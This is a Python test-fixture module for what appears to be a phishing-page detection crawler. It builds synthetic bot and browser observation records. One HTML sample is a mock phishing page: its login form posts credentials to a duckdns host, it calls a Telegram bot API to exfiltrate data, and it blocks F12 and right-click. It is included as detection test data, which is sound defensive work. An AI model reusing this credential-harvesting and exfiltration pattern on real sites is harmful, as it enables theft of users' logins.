"""測試用的合成觀察紀錄：欄位形狀與 crawler/ 產生的一致，但不發任何請求。"""
import copy

from crawler.records import new_record, script_inventory, summarize_html
from crawler.profiles import BASELINE, BROWSER
from schemas.evidence import sha256

URL = "https://portal-update.example.com/signin"

CLEAN = """
<html><head><title>Welcome</title></head><body><h1>Welcome</h1>
<p>Our service is currently under maintenance. Please check back later.</p>
</body></html>
"""

# 表單送往免費主機 + Telegram 外洩 + 封鎖 F12（高特異性機制）
MALICIOUS = """
<html><head><title>Welcome</title></head><body oncontextmenu="return false;">
<form action="https://collector-9x.duckdns.org/next.php" method="post">
  <input type="text" name="email"><input type="password" name="password">
</form>
<script>
document.getElementById('password').value;
document.querySelector('[type="password"]');
fetch('https://api.telegram.org/bot123456789:AAFvE7xxxxxxxxxxxxxxxxxxxxxxxxxxxxx/sendMessage?chat_id=1');
document.onkeydown = function(e){ if(e.keyCode === 123) return false; };
</script></body></html>
"""

# 一般會員登入頁：只有「頁面有密碼欄位」這類頁面特徵
LOGIN_PAGE = """
<html><head><title>Welcome</title></head><body><h1>Member sign in</h1>
<form action="/session" method="post">
  <input type="email" name="email" required>
  <input type="password" name="password" required minlength="8">
  <button type="submit">Sign in</button>
</form></body></html>
"""


def record(html, *, kind="http_baseline", status=200, error=None, url=URL, dom=None, access=0, **extra):
    """一次觀察。kind="browser" 時 dom 預設等於主文件（沒有 JS 改動）。"""
    rec = new_record(kind, url, BROWSER if kind == "browser" else BASELINE)
    summary = summarize_html(html)
    rec.update(status_code=status, error=error, html=html, html_length=len(html), html_sha256=sha256(html),
               text_content=summary["text"], title=summary["title"], scripts=script_inventory(summary),
               final_url=url, redirect_chain=[url] if status else [], access_index=access,
               role="human" if kind == "browser" else "bot")
    if kind == "browser":
        dom = html if dom is None else dom
        dom_summary = summarize_html(dom)
        rec.update(dom_html=dom, dom_text=dom_summary["text"], dom_title=dom_summary["title"],
                   dom_sha256=sha256(dom), dom_length=len(dom), page_url=url,
                   browser_version="fixture-1", playwright_version="fixture-1",
                   dom_domcontentloaded_html=dom,
                   dom_snapshots=[{"at": "domcontentloaded", "sha256": sha256(dom), "html_length": len(dom),
                                   "text_length": len(dom_summary["text"])},
                                  {"at": "settled", "sha256": sha256(dom), "html_length": len(dom),
                                   "text_length": len(dom_summary["text"])}])
    rec.update(extra)
    return rec


def pair(bot1, human1, bot2=None, human2=None, order="bot_first"):
    """主配對 + 重複配對（預設同內容）。access_index 依交錯順序編號。"""
    bot, human = copy.deepcopy(bot1), copy.deepcopy(human1)
    bot["confirmation"] = copy.deepcopy(bot2 if bot2 is not None else bot1)
    human["confirmation"] = copy.deepcopy(human2 if human2 is not None else human1)
    first, second = (bot, human) if order == "bot_first" else (human, bot)
    first["access_index"], second["access_index"] = 1, 2
    first["confirmation"]["access_index"], second["confirmation"]["access_index"] = 3, 4
    for rec in (bot, human, bot["confirmation"], human["confirmation"]):
        rec["crawl_order"] = order
    return bot, human


def browser(html, **kw):
    return record(html, kind="browser", **kw)


def fake_observer(bot, human, variants=None, errors=()):
    """替換 nodes.node1_scraper.observe_url 的假觀察（不發請求）。"""
    def observe(url, settings):
        return {"bot": copy.deepcopy(bot), "human": copy.deepcopy(human), "variants": variants or {},
                "order": bot.get("crawl_order", "bot_first"),
                "plan": "bot_first:B1,H1,B2,H2;variants=", "errors": list(errors)}
    return observe
